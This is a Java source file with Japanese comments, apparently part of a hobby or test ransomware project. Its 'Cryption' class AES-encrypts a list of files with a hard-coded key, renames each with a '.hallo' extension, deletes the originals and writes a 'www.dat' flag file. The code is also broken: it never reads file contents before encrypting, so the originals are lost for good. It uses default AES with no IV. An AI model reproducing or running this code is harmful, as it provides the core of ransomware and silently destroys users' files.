package cipher;

import finder.GetTestPath;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.List;

public class Cryption {

  /**
   * 共通鍵暗号化方式::AES でファイルを暗号化する
   *
   * @param fileInput  ファイル
   * @param commonKey  共通キーになる秘密キー (128 bit key)
   * @param fileOutput 暗号化されて排出されるファイル
   */
  private void fileEncrypt(int cryptMode, String commonKey, File fileInput, File fileOutput) {
    Key skeySpec;
    Cipher cipher;

    FileInputStream inputStream = null;
    FileOutputStream outputStream = null;

    try {
      // 暗号化ロジック
      skeySpec = new SecretKeySpec(commonKey.getBytes(), "AES");
      cipher = Cipher.getInstance("AES");
      cipher.init(cryptMode, skeySpec); // ここに 16byte の initVector 追加したかった

      // File IO
      inputStream = new FileInputStream(fileInput);
      byte[] inputBytes = new byte[(int) fileInput.length()];

      byte[] outputBytes = cipher.doFinal(inputBytes);
      outputStream = new FileOutputStream(fileOutput);
      outputStream.write(outputBytes);

      // 暗号化が終わったら、元のファイルを削除する
      fileInput.delete();

    } catch (NoSuchAlgorithmException
        | NoSuchPaddingException
        | BadPaddingException
        | InvalidKeyException
        | IllegalBlockSizeException
        | IOException e) {
      e.printStackTrace();
    } finally {
      try {
        if (inputStream != null) inputStream.close();
        if (outputStream != null) outputStream.close();
      } catch (IOException e) {
        e.printStackTrace();
      }
    }
  }

  /**
   * ファイルリストを暗号化し、拡張子を変換する
   *
   * @param files 複数のファイル
   */
  public void exeEncrypt(List<File> files) {

    files.forEach(file -> fileEncrypt(Cipher.ENCRYPT_MODE, CryptionKeys.COMMON_KEY,
        file, new File(file.getPath() + ".hallo")));

    System.out.println("[log] 暗号化完了");

    // 暗号化が終わったら、フラグファイルを追加する
    FileOutputStream output = null;
    try {
      output = new FileOutputStream(GetTestPath.TEST_PATH + "www.dat");

      System.out.println("[log] フラグ追加完了");

    } catch (IOException e) {
      e.printStackTrace();
    } finally {
      try {
        if (output != null) output.close();
      } catch (IOException e) {
        e.printStackTrace();
      }
    }
  }
}
